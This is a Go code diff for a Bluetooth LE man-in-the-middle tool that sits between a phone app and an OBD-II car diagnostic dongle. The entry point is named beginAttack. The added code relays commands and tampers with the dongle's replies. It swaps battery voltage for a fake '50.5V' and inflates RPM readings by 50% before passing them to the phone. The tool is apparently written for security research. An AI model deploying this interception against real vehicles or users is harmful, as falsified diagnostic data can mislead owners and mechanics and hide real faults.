@@ -7,6 +7,7 @@ import (
 	"os"
 	"strings"
 	"time"
+	"strconv"
 
 	"github.com/paypal/gatt"
 	//"github.com/paypal/gatt/examples/option"
@@ -15,8 +16,37 @@ import (
 
 var done = make(chan struct{})
 var gd gatt.Device
-var sg gatt.Device
+var publicPhoneData []byte
+var publicDongleData []byte
+var tmpDongleData string
+
+
+var phoneSent bool
+var dongleSent bool
 var isPhoneConnected bool
+var isDongleConnected bool
+var autoConnect bool
+var ATcommand string
+
+func getHexRPM(x []byte, pctIncrease float64) []byte {
+	xs := string(x)
+	var lastFour = xs[len(xs)-7:]
+	lastFour = strings.Replace(lastFour, "\r", "", 2)
+	lastFour = strings.Replace(lastFour, ">", "", 1)
+	
+	value, err := strconv.ParseInt(lastFour, 16, 64)
+	if err != nil {
+		fmt.Printf ("Conversion failed: %s\n", err)
+	}
+
+	newVal := float64(value)*pctIncrease
+
+	hex_value := strconv.FormatInt(int64(newVal), 16)
+
+	nx := xs[:len(xs)-7] + string(hex_value) + "\r\r>"
+	nxToByte := []byte(nx)
+	return nxToByte
+}
 
 func onStateChanged(d gatt.Device, s gatt.State) {
 	fmt.Println("State:", s)
@@ -50,6 +80,7 @@ func onPeriphDiscovered(p gatt.Peripheral, a *gatt.Advertisement, rssi int) {
 
 func onPeriphConnected(p gatt.Peripheral, err error) {
 	fmt.Println("Connected to Dongle")
+	isDongleConnected = true
 	go connectToPhone()
 	for isPhoneConnected == false {
 		// Will not continue until phone connection has been established.
@@ -123,14 +154,41 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 			}
 			// Write to Dongle
 			if (strings.Contains(c.Properties().String(), "write")) {
-				fmt.Println("| Ready to write commands towards dongle ... ")
-				p.WriteCharacteristic(c, []byte("ATZ\r>"), false)
+				for isPhoneConnected {
+					fmt.Println("| Ready to write commands towards dongle ... ")
+					for phoneSent == false {
+						// Awaiting data from Phone to be sent towards the Dongle ...
+					}
+					phoneSent = false // Data from phone was recieved, reset state to false.
+					var stringData = string(publicPhoneData)
+					// stringData - for modifying data, please add to ATcommand - which specific data should be modified.
+					switch {
+					case strings.Contains(stringData, "AT RV"): // AT RV = BATTERY VOLTAGE
+						ATcommand = "RV"
+					case strings.Contains(stringData, "010C"): // 010C = RPM
+						ATcommand = "010C"
+					}
+
+					p.WriteCharacteristic(c, publicPhoneData, false)
+					publicPhoneData = []byte("")
+				}
 			}
 
 			// Subscribe the characteristic, if possible.
 			if (c.Properties() & (gatt.CharNotify | gatt.CharIndicate)) != 0 {
 				f := func(c *gatt.Characteristic, b []byte, err error) {
 					fmt.Printf("notified: % X | %q\n", b, b)
+					// notify back to RPI -> Phone:
+					var stringNotification = string(b)
+					tmpDongleData = tmpDongleData + stringNotification
+
+					switch {
+					case strings.Contains(stringNotification, ">"):
+						publicDongleData = []byte(tmpDongleData)
+						fmt.Println(">> Dongle sent data back")
+						dongleSent = true
+						tmpDongleData = ""
+					}
 				}
 				if err := p.SetNotifyValue(c, f); err != nil {
 					fmt.Printf("Failed to subscribe characteristic, err: %s\n", err)
@@ -147,10 +205,16 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 
 func onPeriphDisconnected(p gatt.Peripheral, err error) {
 	fmt.Println("Dongle is disconnected")
-	connectToDongle()
-	//close(done) // NEVER CLOSE
+	isDongleConnected = false
+	dongleSent = false
+	phoneSent = false
+	if autoConnect {
+		connectToDongle()
+	} else {
+	close(done)
+	}
 }
-func NewCountTestService() *gatt.Service {
+func writeService() *gatt.Service {
 
 	s := gatt.NewService(gatt.MustParseUUID("0000fff0-0000-1000-8000-00805f9b34fb"))
 
@@ -167,8 +231,31 @@ func NewCountTestService() *gatt.Service {
 		func(r gatt.Request, data []byte) (status byte) {
 			isPhoneConnected = true
 			fmt.Println("| Ready to handle data from phone")
-			fmt.Println("| Phone sent: " + string(data))
-			phone.Write(data)
+			for isDongleConnected == false {
+				// Do not continue until Dongle connection has been established
+			}
+			// Update data that will be sent to Dongle:
+			publicPhoneData = data
+			phoneSent = true
+			fmt.Println(">> Phone sent data towards dongle")
+			for dongleSent == false {
+				// Awaiting data from Dongle ...
+			}
+			dongleSent = false // Dongle response was recieved, reset state to false.
+			// Notification from Dongle was recieved
+			var dataBackToPhone = publicDongleData
+			switch {
+			case ATcommand == "RV":
+				// modify voltage from dongle
+				dataBackToPhone = []byte("50.5V\r>")
+			case ATcommand == "010C":
+				// Modify RPM
+				dataBackToPhone = getHexRPM(dataBackToPhone, 1.5) // default, increase RPM by 50% = 1.5
+			}
+			phone.Write(dataBackToPhone)
+			ATcommand = ""
+			dataBackToPhone = []byte("")
+			publicDongleData = []byte("")
 			return gatt.StatusSuccess
 		})
 	return s
@@ -180,7 +267,12 @@ func connectToPhone() {
 		gatt.CentralConnected(func(c gatt.Central) {
 			fmt.Println("| Phone is connected, connections id: ", c.ID())
 		}),
-		gatt.CentralDisconnected(func(c gatt.Central) { fmt.Println("| Phone is disconnected: ", c.ID()); isPhoneConnected = false }),
+		gatt.CentralDisconnected(func(c gatt.Central) { 
+			fmt.Println("| Phone is disconnected: ", c.ID())
+			isPhoneConnected = false
+			phoneSent = false
+			dongleSent = false
+		}),
 	)
 	// A mandatory handler for monitoring device state.
 	onStateChanged := func(d gatt.Device, s gatt.State) {
@@ -193,7 +285,7 @@ func connectToPhone() {
 			d.AddService(service.NewGattService())         // no effect on OS X
 
 			// A simple count service for demo.
-			s1 := NewCountTestService()
+			s1 := writeService()
 			d.AddService(s1)
 
 			// Advertise device name and service's UUIDs.
@@ -242,7 +334,11 @@ func beginAttack() {
 
 
 func main() {
+	autoConnect = true
 	isPhoneConnected = false
+	isDongleConnected = false
+	phoneSent = false
+	dongleSent = false
 	beginAttack()
 }
 
